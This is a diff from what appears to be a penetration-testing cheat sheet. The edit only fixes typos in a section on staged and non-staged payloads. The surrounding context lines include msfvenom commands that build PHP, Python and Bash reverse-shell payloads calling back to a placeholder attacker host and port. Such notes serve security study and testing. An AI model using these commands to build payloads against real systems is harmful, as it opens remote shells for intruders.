@@ -233,9 +233,9 @@ php: `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > s
 python: `msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py` <br/>
 bash: `msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh` <br/>
 ### staged and non-staged
-Non-staged: sent in its entirety <br/>
+Non-staged: Sent in its entirety <br/>
 `windows/shell_reverse_tcp`<br/>
-Staged:payload is sent in two parts. Firs part contains small primary payload that causes the victim machine to connect back to the attacker, transfer a larger secondary payload. <br/>
+Staged: Sent in two parts. First part contains small primary payload that causes the victim machine to connect back to the attacker, transfer a larger secondary payload. <br/>
 `windows/shell/reverse_tcp`
 
 
